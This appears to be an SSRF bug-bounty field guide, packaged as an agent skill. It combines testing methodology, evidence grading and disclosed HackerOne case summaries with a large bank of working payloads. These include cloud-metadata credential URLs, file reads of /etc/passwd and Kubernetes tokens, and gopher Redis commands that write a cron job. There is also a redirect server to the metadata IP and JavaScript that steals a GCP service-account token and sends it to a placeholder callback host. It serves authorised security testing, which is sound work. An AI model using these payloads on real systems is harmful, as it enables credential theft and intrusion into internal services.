| CVE-2026-57126 — PraisonAI | Literal-host checks ran before hostname resolution, leaving DNS-based destination validation incomplete |
| GHSA-3rxj-6jhw-qfv7 — MCP mcp-server-fetch (2026-11-11) | IPv6 site-local (fec0::/10) classification gap in the fetch guard; advisory rates practical reachability low on default hosts — don't overclaim this one without independent reachability evidence |

Research hygiene: always reopen the vendor advisory before citing affected/fixed versions in a live report — CNA, NVD, and vendor release notes can disagree, and advisory details get superseded.

---

### 5.1 Model the request path

For any candidate sink, trace the value end-to-end and ask these questions at each stage — don't mark a stage "safe" just because *a* check exists somewhere:

| Stage | Questions to answer |
|---|---|
| Input | Which field influences the destination? User-supplied, stored, imported, generated, or derived from retrieved/model content? |
| Transformation | Is it decoded, normalized, concatenated, templated, path-joined, or rewritten by an SDK before reaching the fetcher? |
| Parser | Which parser interprets scheme/host/port/path/userinfo? Does a different parser reinterpret it later (§4.3)? |
| Policy | Is there a real destination/allowlist check, or only a UI hint / model instruction? |
| Resolver | Which resolver runs, are both A and AAAA answers considered, what happens on partial failure? |
| Connector | Does the connector actually use the address policy approved, or can a custom dispatcher/proxy re-resolve? |
| Redirects | Automatic or manual? Is each hop independently re-checked (§4.8 territory)? |
| Response | Body, headers, status, timing, screenshot, PDF, or model-generated summary exposed back? |
| Execution | Immediate, queued, retried, scheduled, or delegated to another service identity? |

The single highest-value question: where is the last security decision before the network connection is actually made, and can anything downstream of it change the destination? Most real bypasses live in the gap between that decision and the actual connect call.

### 5.2 Sink inventory template

When a target has several URL-accepting features, don't lump them together — log one row per distinct sink so you don't re-test the same guard twice or miss one implemented differently:

`Feature | Input | Trigger | Sink/library | Policy | Resolution | Redirects | Response | Identity | Evidence | Confidence`

- **Trigger:** immediate request, import job, queued/scheduled task, agent tool call, retry.
- **Identity:** anonymous user, your account, a service account, a worker role, or an agent/MCP identity — a sink that runs under a more privileged identity than the one you hold is a bigger finding even if the request is identical.
- **Confidence:** confirmed / probable / unverified / disproved — keep it honest as you go; don't let probable quietly become confirmed.

### 5.3 Evidence and confidence grading (E0–E5)

Don't let OOB-fired-once collapse into "critical SSRF" without checking what tier of evidence you actually have:

| Level | Observation | What it actually proves |
|---|---|---|
| E0 — Reflection | Your value appears in a response/error | Input reflection only — not SSRF by itself |
| E1 — DNS | Your unique hostname resolves (DNS hit) | Something resolved the hostname; HTTP fetch is not proven yet |
| E2 — HTTP callback | Your controlled endpoint gets an attributable HTTP hit | An HTTP-capable component made the outbound request |
| E3 — Response propagation | A marker from your controlled response reaches you back | Full-read SSRF — response propagation confirmed |
| E4 — Policy failure demonstrated | A restricted address/hostname you expected blocked is actually reached | Destination enforcement genuinely fails, not just "theoretically could" |
| E5 — Boundary/identity effect | You get cross-tenant data, a different service's credentials, or privilege you shouldn't have | The specific authorization boundary is broken |

Insufficient on their own, don't report yet: a validator merely accepting your string, a status-code/timing change with no independent attribution, a tool/agent claiming it fetched something, a DNS event you can't tie to your specific test input, or a callback with no unique per-test identifier. These read like evidence but aren't — get to at least E2 (ideally E3+) before writing anything up.

### 5.5 Address-classification details

A hostname can resolve to a mix of public and non-public A/AAAA answers — policy must evaluate the complete answer set, not approve the hostname just because one answer looked public.

The core TOCTOU bug: the app checks one resolved address, then the HTTP stack resolves the hostname again at connect time. A correct implementation pins the already-approved address to the actual connect call rather than re-resolving. When you see a guard that does "DNS check, then pass the hostname to a normal HTTP client," that's a strong signal a DNS-rebinding or redirect-based (§4.14/§4.16/§4.17) bypass is possible.

### 8.3 Disclosed report citations (verified cases)

- **HackerOne — SSRF in Analytics Reports (PDF generator → AWS metadata)** (H1 #2262382). Headless-browser SSRF via a PDF generator chained into AWS metadata SSRF (IMDSv1). Payload: an injected `<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">` in a template fragment rendered server-side into a PDF, reflecting the IMDS response in the output. Root cause: unsanitised user-controlled template fragment reflected in the PDF rendering pipeline; no IMDSv2 enforcement. 2023 — $25,000 (CVSS 10.0 Critical).
- **Shopify Exchange — SSRF in screenshot service → GCP metadata → container root** (H1 #341876). GCP metadata SSRF escalating into an SSRF-to-RCE chain. Root cause: the screenshotter fetched a user-controlled template with no metadata-host blocklist and no metadata-concealment proxy. 2018 — $25,000 (canonical headless-browser → metadata case).
- **Concrete CMS — SSRF mitigation bypass via DNS rebinding → AWS IAM keys** (H1 #1369312). DNS-rebinding SSRF escalating into AWS metadata SSRF (IMDSv1) via a file-upload-from-URL feature; an attacker-controlled DNS server alternated A records between a public IP and 169.254.169.254, needing 2–3 requests to win the race before retrieving IAM role credentials. Root cause: hostname validated by resolving once; the download path re-resolved DNS without pinning the validated IP. 2021 — fixed in 8.5.7 / 9.0.1.
- **Yahoo Mail — Blind SSRF → Gopher → Redis RCE** (writeup). Gopher-protocol abuse chaining a Redis SSRF into RCE: blind SSRF reached an internal unauthenticated Redis instance via a gopher payload that issued `FLUSHALL`/`SET`/`BGSAVE` to write a cron entry. Root cause: gopher scheme not blocklisted; internal Redis unauthenticated on its default port; the SSRF target accepted a 302 redirect from an attacker host to a `gopher://` URL. 2020 — $15,000.
- **Reddit Matrix — Blind SSRF in preview_link API** (H1 #1960765). Blind link-preview SSRF enabling internal port-scanning via timing/response-code differences, via `GET https://matrix.redditspace.com/_matrix/media/r0/preview_url/?url=`. Root cause: the link-preview fetcher did not reject RFC1918/link-local destinations and allowlisted only by scheme. 2023 — $6,000.
- **Azure DevOps — SSRF in Service Hooks + DNS rebinding bypass in endpointproxy** (Binary Security writeup). Webhook-URL-field SSRF combined with DNS-rebinding SSRF reaching Azure IMDS/managed identity, by configuring a service-hook webhook or `endpointproxy` URL parameter to a rebinding host whose second DNS resolution returned 169.254.169.254, then chaining CRLF injection to set the `Metadata: true` header Azure IMDS requires. Root cause: validate-then-fetch using separate DNS lookups; CRLF in the URL path injected headers needed for Azure IMDS. 2023–2024 — $15,000 total across 3 reports.

### 9.3 ffuf commands

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_ssrf.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_ssrf.txt \
     -mr 'canary|error|invalid|not found' -rate 40
ffuf -u 'https://target/api?<param>=FUZZ' -w $W/payloads_ssrf.txt \
     -mr '<hit-marker>' -rate 20
```

### 9.4 Param discovery

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -u "https://target.com/api/endpoint?FUZZ=https://YOUR.callback.com" \
  -fs 0 -mc all
```

### Part 11 — How to use this during an engagement

1. Confirm the obvious payloads are actually blocked. Test `127.0.0.1`, `localhost`, `169.254.169.254`, `[::1]` first — don't assume. (§1.4)
2. Find sinks. Work through §1.1 functionality list, §1.3 URL/JS signals, and §1.2 parameter wordlist. Log them in a §5.2 sink inventory.
3. OOB-confirm every candidate parameter individually (OOB gate). Negative control, one payload per field, poll between requests.
4. Work through Gate 0's four questions (§4.0) against the guard's actual implementation (source review if available — use §5.1's path model — black-box inference otherwise).
5. Pick vectors matching the target's stack. Containerized → §4.4 / §4.12. SSR framework → §4.10. Edge/CDN-fronted → §4.6. Service mesh → §4.7. "Test connection" feature → §4.11. Webhook/custom-header feature → §4.8. Agentic/MCP → §5.4.
6. Grade evidence (§5.3 E0–E5) before calling it confirmed. Retract any claim below E2.
7. Escalate — check §4.9 and §4.15 logic to see whether it moves past "the server requested my URL" into credential theft, internal data read, RCE, or cross-tenant write. That's what separates low/medium SSRF from critical.
8. Meet the pre-report Gate 0 (§10) and reporting bar before submitting.

---

### Basic Out-of-Band Detection

```bash
# Using interactsh-client
interactsh-client -v

# Test parameter
curl -s "https://target.com/api/preview?url=https://YOUR_ID.oast.pro"

# With common headers that might unlock SSRF
curl -s "https://target.com/api/fetch" \
  -H "Content-Type: application/json" \
  -d '{"url":"https://YOUR_ID.oast.pro"}'
```

### Redirect-Based SSRF (when direct is blocked)

```python
# Simple Python redirect server
from http.server import HTTPServer, BaseHTTPRequestHandler

class Redirect(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(301)
        self.send_header('Location', 'http://169.254.169.254/latest/meta-data/')
        self.end_headers()

HTTPServer(('0.0.0.0', 8080), Redirect).serve_forever()
```

### JavaScript-Based SSRF (headless browser contexts)

```javascript
// Exfil via fetch
fetch('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', {
  headers: {'Metadata-Flavor': 'Google'}
}).then(r=>r.text()).then(d=>{
  fetch('https://YOUR.callback.com/?d='+btoa(d))
})

// DNS exfil for blind contexts
var x = new XMLHttpRequest();
x.open('GET','http://169.254.169.254/latest/meta-data/');
x.send();
x.onload = function(){
  var img = new Image();
  img.src = 'https://'+btoa(x.responseText.substring(0,50))+'.YOUR.callback.com';
}
```

### ffuf Parameter Discovery

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -u "https://target.com/api/endpoint?FUZZ=https://YOUR.callback.com" \
  -fs 0 -mc all
```

---

### TOCTOU (Time-of-Check vs Time-of-Use)

- Validate URL → sleep → redirect to internal (race condition with DNS rebinding)
- Register a domain with 0-TTL, rotate DNS between validation and fetch calls

### When Response is Not Returned (Blind SSRF)

- Use DNS-only callbacks (data encoded in subdomain labels)
- Use timing differences for port scanning
- Use different HTTP methods (PUT/DELETE) to trigger distinct behaviors on internal services
- Chain with other bugs that leak response data (e.g., error messages, logs)

---

## Companion methodology (merged, deduplicated)

Full text of every non-SKILL.md methodology file from the contributing skills — payload banks, technique references, reconnaissance and attack-class guides.

### Companion: hunting / references/payloads.md

# SSRF — Combined Field Guide — Payload reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.

---

## Payloads & probes



- Cloud metadata -> `http://169.254.169.254/latest/meta-data/` `http://metadata.google.internal/computeMetadata/v1/`

- Loopback -> `http://127.0.0.1` `http://[::1]` `http://0x7f000001` `http://2130706433`

- Bypass form -> `http://169.254.169.254\@127.0.0.1:8000/` `http://127.1` `http://0177.0.0.1`

- Scheme abuse -> `file:///etc/passwd` `gopher://127.0.0.1:6379/_INFO` `dict://127.0.0.1:11211/stat`

- Redirect -> `https://trusted.com/redirect?url=http://169.254.169.254/`



## Payload bank



**85 curated payloads** in 6 context groups. Try them in order, stop at the first hit, then minimize. These are seeds, not a substitute for understanding the sink.



### Loopback & internal services



```text

http://127.0.0.1/

http://127.0.0.1:80/

http://localhost/

http://[::1]/

http://0.0.0.0/

http://127.1/

http://127.0.1/

http://2130706433/

http://0x7f000001/

http://0177.0.0.1/

http://127.0.0.1.nip.io/

http://127.0.0.1.sslip.io/

http://localtest.me/

http://[::ffff:127.0.0.1]/

http://[0:0:0:0:0:ffff:127.0.0.1]/

http://127.0.0.1:22/

http://127.0.0.1:6379/

http://127.0.0.1:11211/

http://127.0.0.1:9200/

http://127.0.0.1:8080/

http://127.0.0.1:3000/

http://127.0.0.1:8500/v1/catalog/services

```



### Cloud metadata



```text

http://169.254.169.254/latest/meta-data/

http://169.254.169.254/latest/meta-data/iam/security-credentials/

http://169.254.169.254/latest/user-data/

http://169.254.169.254/latest/dynamic/instance-identity/document

http://169.254.169.254/metadata/v1.json

http://169.254.169.254/metadata/v1/id

http://169.254.169.254/openstack/latest/meta_data.json

http://metadata.google.internal/computeMetadata/v1/

http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json

http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

http://100.100.100.200/latest/meta-data/

http://192.0.0.192/latest/meta-data/

http://169.254.169.254/metadata/instance?api-version=2021-02-01

http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

http://metadata.google.internal/computeMetadata/v1/project/project-id

```



### Allowlist & parser bypass



```text

http://169.254.169.254\@127.0.0.1:8000/latest/meta-data/

http://127.0.0.1@169.254.169.254/

http://169.254.169.254#@127.0.0.1/

http://169.254.169.254%2f@127.0.0.1/

http://127.0.0.1:80@evil.com/

http://evil.com:80@127.0.0.1/

http://127.0.0.1%00.evil.com/

http://127.0.0.1%20.evil.com/

http://127.0.0.1.attacker.com/

http://attacker.com#@127.0.0.1/

http://attacker.com?@127.0.0.1/

http://127.0.0.1./

http://127.0.0.1:80\@evil.com/

//127.0.0.1/

\\127.0.0.1\

http://evil.com\@127.0.0.1/

http://127.0.0.1%09.evil.com/

http://127.0.0.1%0d%0a.evil.com/

```



### Redirect & DNS tricks



```text

http://attacker.com/redirect?url=http://169.254.169.254/

https://attacker.com/302?to=http://127.0.0.1/

http://attacker.com/open?next=http://metadata.google.internal/

http://127.0.0.1.nip.io/

http://169.254.169.254.nip.io/

http://metadata.google.internal.nip.io/

http://spoofed.burpcollaborator.net/

http://127.0.0.1.sslip.io/

http://localhost.localdomain/

http://localhost./

```



### Non-HTTP schemes



```text

file:///etc/passwd

file:///c:/windows/win.ini

file:///proc/self/environ

file:///var/run/secrets/kubernetes.io/serviceaccount/token

gopher://127.0.0.1:6379/_INFO

dict://127.0.0.1:11211/stat

ftp://127.0.0.1/

sftp://127.0.0.1/

ldap://127.0.0.1/

tftp://127.0.0.1/

netdoc:///etc/passwd

jar:http://127.0.0.1/x.jar!/

php://filter/convert.base64-encode/resource=index.php

expect://id

```



### Protocol smuggling (gopher / redis / memcached)



```text

gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A

gopher://127.0.0.1:6379/_%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2433%0D%0A%0D%0A%0A%2A%2F%2A%20%2A%20%2A%20%2A%20%2A%20root%0D%0A

gopher://127.0.0.1:11211/_stats%0D%0A

gopher://127.0.0.1:11211/_set%20x%200%200%201%0D%0Aa%0D%0A

gopher://127.0.0.1:25/_EHLO%20localhost%0D%0A

gopher://127.0.0.1:3306/_

gopher://127.0.0.1:5432/_

gopher://127.0.0.1:9000/_

```



Copyable lists:

- `~/.local/share/hackerone-reports/wordlists/payloads_ssrf.txt` (85)

- `~/.local/share/hackerone-reports/wordlists/payloads_ssrf_waf.txt` (26 filter/WAF-focused)



## Payload fragments observed



Recurring payloads from this class's writeups. Adapt, don't paste blindly.



| Seen | Fragment |

|---:|---|

| 4× | `http://[fe80::1%25eth0]/` |

| 4× | `fe80::1%eth0` |

| 3× | `(scheme, hostname, port)` |

| 2× | `https://<your-attacker-server>/redir.php` |

| 2× | `RealPlayerApi.apply()` |

| 2× | `http://169.254.169.254\@127.0.0.1:8000/latest/meta-data/` |

| 2× | `{readapi.<url_here>}` |

| 2× | `http.<url>.proxy` |

| 2× | `..%2F..%2Fapi/v0/shutdown` |

| 2× | `%2F` |

| 2× | `fe80::1%1` |

| 2× | `%eth0` |

| 2× | `Unknown mime-type: text/html; charset=UTF-8` |

| 2× | `Curl_idn_decode()` |

| 2× | `$('.upgradeToAdmin').click(function () { / let t = $('input[name="username"]').val(); / $.get('/admin/upgrade?username=' + t, function () {` |

| 2× | `POST /hate-mail-generator/new/preview HTTP/1.1 / Host: hackyholidays.h1ctf.com / ...... / preview_markup=Hello,{{name}}&preview_data={"name` |

| 2× | `{{}}` |

| 1× | `<script> / window.location="http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token"; / // iframes d` |

| 1× | `<script> / window.location="http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json"; / </script>` |

| 1× | `curl -X POST "https://www.googleapis.com/compute/v1/projects/███/setCommonInstanceMetadata" -H "Authorization: Bearer ██████████████" -H "Co` |



## Parameters observed



`url` · `hash` · `username` · `template` · `password` · `id` · `data` · `payload` · `alt` · `format` · `email` · `month` · `year` · `template[]` · `image` · `name` · `target` · `start` · `command` · `user_id`



## Wordlists



Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.



| File | Entries |

|---|---:|

| `~/.local/share/hackerone-reports/wordlists/paths_ssrf.txt` | 150 |

| `~/.local/share/hackerone-reports/wordlists/params_ssrf.txt` | 150 |

| `~/.local/share/hackerone-reports/wordlists/payloads_ssrf.txt` | 85 |

| `~/.local/share/hackerone-reports/wordlists/payloads_ssrf_waf.txt` | 26 |

| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |

| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |



```sh

W=~/.local/share/hackerone-reports/wordlists

ffuf -u https://target/FUZZ -w $W/paths_ssrf.txt \

     -mc all -fc 404 -fs 0 -rate 40

ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_ssrf.txt \

     -mr 'canary|error|invalid|not found' -rate 40

ffuf -u 'https://target/api?<param>=FUZZ' -w $W/payloads_ssrf.txt \

     -mr '<hit-marker>' -rate 20

```



## Nuclei



Set up an interactsh/OAST listener first; SSRF templates often only prove outbound traffic.



```sh

nuclei -u https://target -tags ssrf,oast \

       -severity low,medium,high,critical -rl 40 -o nuclei_ssrf.txt

nuclei -u https://target -t ~/nuclei-templates/dast/vulnerabilities/ssrf -dast \

       -rl 40 -o nuclei_ssrf_ssrf.txt

nuclei -u https://target -t ~/nuclei-templates/http/fuzzing/ssrf-via-proxy.yaml \

       -rl 40 -o nuclei_ssrf_ssrf-via-proxy.txt

# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'

```



Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.



## Payload & Detection Patterns



### Basic Out-of-Band Detection

```bash

# Using interactsh-client

interactsh-client -v



# Test parameter

curl -s "https://target.com/api/preview?url=https://YOUR_ID.oast.pro"



# With common headers that might unlock SSRF

curl -s "https://target.com/api/fetch" \

  -H "Content-Type: application/json" \

  -d '{"url":"https://YOUR_ID.oast.pro"}'

```



### Cloud Metadata Payloads

```bash

# GCP - requires Metadata-Flavor header (test if server adds it automatically)

http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

http://169.254.169.254/computeMetadata/v1/project/project-id

http://metadata/computeMetadata/v1/

http://169.254.169.254/computeMetadata/v1/



# AWS IMDSv1 (no auth required)

http://169.254.169.254/latest/meta-data/iam/security-credentials/

http://169.254.169.254/latest/user-data

# AWS ECS task credentials (retrieve from env var AWS_CONTAINER_CREDENTIALS_RELATIVE_URI)

http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}



# Azure - instance metadata and managed identity token

http://169.254.169.254/metadata/instance?api-version=2021-02-01

http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# Requires Metadata: true header for Azure requests



# Kubernetes service account credentials (file:// SSRF)

file:///var/run/secrets/kubernetes.io/serviceaccount/token

file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt

```



### Localhost/Internal Port Payloads

```bash

# Kubernetes internals

http://127.0.0.1:6443/api/v1/namespaces

http://10.0.0.1:6443/api/v1/secrets

http://127.0.0.1:10250/pods          # kubelet

http://127.0.0.1:2379/v2/keys        # etcd



# Common internal services

http://127.0.0.1:6379/               # Redis (check for inline commands)

http://127.0.0.1:9200/_cat/indices   # Elasticsearch

http://127.0.0.1:5601/               # Kibana

http://127.0.0.1:8500/v1/catalog/services  # Consul

```



### Redirect-Based SSRF (when direct is blocked)

```python

# Simple Python redirect server

from http.server import HTTPServer, BaseHTTPRequestHandler



class Redirect(BaseHTTPRequestHandler):

    def do_GET(self):

        self.send_response(301)

        self.send_header('Location', 'http://169.254.169.254/latest/meta-data/')

        self.end_headers()



HTTPServer(('0.0.0.0', 8080), Redirect).serve_forever()

```



### JavaScript-Based SSRF (headless browser contexts)

```javascript

// Exfil via fetch

fetch('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', {

  headers: {'Metadata-Flavor': 'Google'}

}).then(r=>r.text()).then(d=>{

  fetch('https://YOUR.callback.com/?d='+btoa(d))

})



// DNS exfil for blind contexts

var x = new XMLHttpRequest();

x.open('GET','http://169.254.169.254/latest/meta-data/');

x.send();

x.onload = function(){

  var img = new Image();

  img.src = 'https://'+btoa(x.responseText.substring(0,50))+'.YOUR.callback.com';

}

```



### Grep Patterns for Source Code Review

```bash

# Find URL fetch operations

grep -rE "(fetch|curl|urllib|requests\.get|http\.get|axios\.get)\s*\(" --include="*.py" --include="*.js" --include="*.go"



# Find URL parameters being passed to HTTP clients

grep -rE "(url|uri|endpoint|redirect|src|source)\s*=\s*req\.(query|body|params)" --include="*.js"



# Find redirect following

grep -rE "(follow_redirects|allow_redirects|followRedirects)\s*=\s*[Tt]rue"

```



### ffuf Parameter Discovery

```bash

ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \

  -u "https://target.com/api/endpoint?FUZZ=https://YOUR.callback.com" \

  -fs 0 -mc all

```



---

### Companion: hunting / references/techniques.md

# SSRF — Combined Field Guide — Technique reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete technique.

---

## Quick wins



Start here. These are the highest-yield tests for this class.



- Find server-side URL fetchers: webhooks, avatar/image import, link preview, PDF/render, RSS, OAuth metadata, import-from-URL.

- Confirm outbound traffic with a unique DNS/HTTP callback before trying internal targets.

- Test the response body, status code, timing, and error text for internal reachability.

- Check redirect-following: a trusted-domain open redirect can bypass host allowlists.

- Try non-HTTP schemes and protocols used by the backend (gopher, file, dict, ftp).



## Bypass tricks



- Decimal/octal/hex IPs, IPv6-mapped addresses, and DNS names resolving to 127.0.0.1.

- DNS rebinding: resolve a controlled hostname to a public IP, then to 169.254.169.254.

- URL parser confusion with @, #, ?, backslashes, %09/%0d%0a, and userinfo.

- Allowlist suffix tricks: trusted.com.evil.com, evil.com#trusted.com, evil.com?trusted.com.

- Use open redirects on allowlisted hosts to reach internal targets.



## Deeper checklist



- Find URL inputs: webhooks, avatars, imports, previews, PDF/render, RSS, OAuth metadata.

- Use a callback domain first to confirm outbound requests (DNS + HTTP).

- Test internal targets: 127.0.0.1, localhost, [::1], 169.254.169.254, RFC1918, internal hostnames.

- Bypass filters with decimal/octal/hex IPs, DNS rebinding, redirects, userinfo, and URL parsing quirks.

- Try non-HTTP schemes: gopher, file, dict, ftp, and cloud metadata endpoints.

- Check redirect-following and allowlist bypass via open redirects on trusted domains.

- Escalate to credential theft, internal API access, or port scanning with evidence.



## Techniques from real reports



One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.



- **SSRF in Exchange leads to ROOT access in all instances** — `#341876` · Shopify · $0 · ▲587

  > However, I found really easy way to "bypass" it while reading the documentation: the `/v1beta1` endpoint is still available, does not require the `Metadata-Flavor: Google` header and still returns the same token.

- **Server-Side Request Forgery using Javascript allows to exfill data from Google Metadata** — `#530974` · Snapchat · $0 · ▲421

  > - Now hit `/api/v1/media/import` on `ads.snapchat.com`, with the URL parameter http://demon.███████/ssrf.html (or wherever you run it)

- **SSRF on project import via the remote_attachment_url on a Note** — `#826361` · GitLab · $10,000 · ▲359

  > A POST request is not possible here, but as `remote attachment request header=` is also available (https://github.com/carrierwaveuploader/carrierwave/blob/v1.3.1/lib/carrierwave/mount.rb L169) and not blacklisted, the payload could be set via a header.

- **Server Side Request Forgery mitigation bypass** — `#632101` · GitLab · $0 · ▲350

  > After the hook has executed, you should see content of `http://169.254.169.254` returned.

- **Blind SSRF to internal services in matrix preview_link API** — `#1960765` · Reddit · $6,000 · ▲344

  > Visit the https://matrix.redditspace.com/ matrix/media/r0/preview url/?url=

- **TURN server allows TCP and UDP proxying to internal network, localhost and meta-data services** — `#333419` · Slack · $3,500 · ▲323

  > UDP packets may be proxied by setting the `XOR-PEER-ADDRESS` to a private IP in the TURN send message indication (method `0x0006`, <https://tools.ietf.org/html/rfc5766 section-10 ).

- **SSRF  leaking internal google cloud data through upload function [SSH Keys, etc..]** — `#549882` · Vimeo · $0 · ▲276

  > For more information you can read my writeup: https://medium.com/@dPhoeniixx/vimeo-upload-function-ssrf-7466d8630437

- **Full read SSRF in www.evernote.com that can leak aws metadata and local file inclusion** — `#1189367` · Evernote · $0 · ▲264

  > The payload is base64 encoded of : `file:///home/abenavides/ .js`

- **SSRF in graphQL query (pwapi.ex2b.com)** — `#1864188` · EXNESS · $3,000 · ▲261

  > The query for `allTicks` allows setting the parameter `source` that is used to do `GET` requests, this can be set arbitrarily .

- **Unauthenticated blind SSRF in OAuth Jira authorization controller** — `#398799` · GitLab · $4,000 · ▲238

  > - send a `POST` request to the `/-/jira/login/oauth/callback` endpoint, as shown below.

- **Full Read SSRF on Gitlab's Internal Grafana** — `#878779` · GitLab · $0 · ▲229

  > On `secure.gravatar.com`, if you supply the `d` parameter, it allows for redirection to `i0.wp.com` where some of the images are hosted.

- **SSRF in webhooks leads to AWS private keys disclosure** — `#508459` · Omise · $0 · ▲214

  > As a result, it is possible to request a number of things, including AWS credentials on the metadata server located at `http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-opsworks-ec2-role`

- **Stored XSS & SSRF in Lark Docs** — `#892049` · Lark Technologies · $3,000 · ▲178

  > A stored XSS (cross site scripting) vulnerability was discovered in Lark Docs that could be escalated into a Server Side Request Forgery (SSRF) vulnerability if opened in a headless browser on the Lark server.

- **SSRF on duckduckgo.com/iu/** — `#398641` · DuckDuckGo · $0 · ▲165

  > `https://duckduckgo.com/iu/?u=http://127.0.0.1:6868%2fstatus%2f?q=http://yimg.com/` returns the following:

- **Server Side Request Forgery** — `#644238` · Lark Technologies · $0 · ▲164

  > https://jinone.github.io/bugbounty-a-simple-ssrf/

- **External SSRF and Local File Read via video upload due to vulnerable FFmpeg HLS processing** — `#1062888` · TikTok · $2,727 · ▲162

  > Make sure that your `header.m3u8` doesn't have anything after `3f` byte(`?` sign).

- **SSRF in Autodesk Rendering leading to account takeover** — `#3024673` · Autodesk · $0 · ▲161

  > A server side request forgery (SSRF) vulnerability was found in Autodesk Rendering, which could have allowed an attacker to send a malicious link to a victim and gain control of their account while logged in.

- **SSRF chained to hit internal host leading to another SSRF which allows to read internal images.** — `#826097` · PlayStation · $1,000 · ▲148

  > Using SSRF to open this URL: https://image.api.np.km.playstation.net/images/?format=png&image=https%3a//store.mgmt.playstation.com/store/api/chihiro/00 09 000/container/US/en/999/UP4134-CUSA00329 00-ONNTGAME00000001/1429722215000/image%3f version%3d00 09…

- **DNS Rebinding SSRF in Burp Suite MCP Server Enables Internal Network Access via send_http1_request Tool** — `#3176157` · PortSwigger Web Security · $0 · ▲144

  > Step2: Setup a DNS server for a domain that you controls that answers the first DNS request on this domain with the IP of a server he controls (in this example 192.168.80.154), and all other DNS requests with 127.0.0.1.

- **Blind SSRF on errors.hackerone.net due to Sentry misconfiguration** — `#374737` · HackerOne · $3,500 · ▲143

  > So I tried to simulate error report with malformed "filename" parameter and got callback on my website from 54.186.141.19 IP.

- **SSRF in https://couriers.indrive.com/api/file-storage** — `#2300358` · inDrive · $0 · ▲141

  > If you request any website like for example ` www.google.com `, ` https://couriers.indrive.com/api/file-storage?url=https://www.google.com `you will see its html content being displayed in the response

- **Server Side Request Forgery (SSRF) in webhook functionality** — `#2301565` · HackerOne · $2,500 · ▲140

  > It occurs when an attacker tricks a server into making requests on their behalf.

- **SSRF on music.line.me through getXML.php** — `#746024` · LY Corporation · $4,500 · ▲135

  > The reporter found an endpoint through which limited SSRF could be achieved.

- **SSRF In Get Video Contents** — `#643622` · Semrush · $0 · ▲125

  > I use URL: `https://1:@127.0.0.1:\@@@@w.youtube.com/@https://www.youtube.com/`, and the response is `{"status":404,"error":"Invalid url 'https:\/\/1:@127.0.0.1:\\@@@@w.youtube.com\/@https:\/www.youtube.com\/' (Status code 404)"}`.(PIC3)

- **Full read SSRF via Lark Docs `import as docs` feature** — `#1409727` · Lark Technologies · $5,000 · ▲124

  > A SSRF (server side request forgery) vulnerability was found in the LarkDocs using the "import as docs" feature, which could have potentially been used to access services running on the internal network.

- **Blind SSRF on https://my.exnessaffiliates.com/ allows for internal network enumeration** — `#1832494` · EXNESS · $0 · ▲120

  > `https://my.exnessaffiliates.com/api/partner integrations/template/probe`

- **Server-Side Request Forgery (SSRF) via Game Export API** — `#3165242` · Lichess · $0 · ▲116

  > Make a request to: `/game/export/[GAME ID]?players=http://169.254.169.254/latest/meta-data/ `

- **SSRF on image renderer** — `#811136` · PlayStation · $1,000 · ▲103

  > image.api.np.km.playstation.net allows image urls to be passed via the `image` parameter

- **Header modification results in disclosure of Slack infra metadata to unauthorized parties** — `#727330` · Slack · $0 · ▲97

  > So, with the blind SSRF vulnerability, the attackers can send arbitrary requests to the intranet, ex: port scanning by identifying the response delay time, to know 169.265.169.254:443 is closed, 169.265.169.254:80 is opened...and so on.

- **[my.stripo.email] Blind SSRF Vulnerability in Stripo App Export via Missing Endpoints Export Email Message to Zapier** — `#2932960` · Stripo Inc · $0 · ▲92

  > The vulnerability exists in the endpoint `/exportservice/v3/exports/WEBHOOK/accounts`.



## Case studies



### SSRF in Exchange leads to ROOT access in all instances

`#341876` · Shopify · $0 · medium · 2018-05-23 · ▲587

> The Exploit Chain - How to get root access on all Shopify instances 1 - Access Google Cloud Metadata - 1: Create a store (partners.shopify.com) - 2: Edit the template password.liquid and add the following content: - 3: Go to https://exchange.shopify.com/create-a-listing and install the Exchange app - 4: Wait for the store screenshot to appear on the Create Listing page - 5: Download the PNG and open it using image editing software or convert it to JPEG…



### Server Side Request Forgery (SSRF) via Analytics Reports

`#2262382` · HackerOne · $25,000 · critical · 2023-12-08 · ▲529

> Hello Gents, I would like to report an issue where attackers are able to read internal files via an SSRF vulnerability. Proof of concept + ███ Impact SSRF. Thanks and have a nice day!



### Server-Side Request Forgery using Javascript allows to exfill data from Google Metadata

`#530974` · Snapchat · $0 · n/a · 2020-11-30 · ▲421

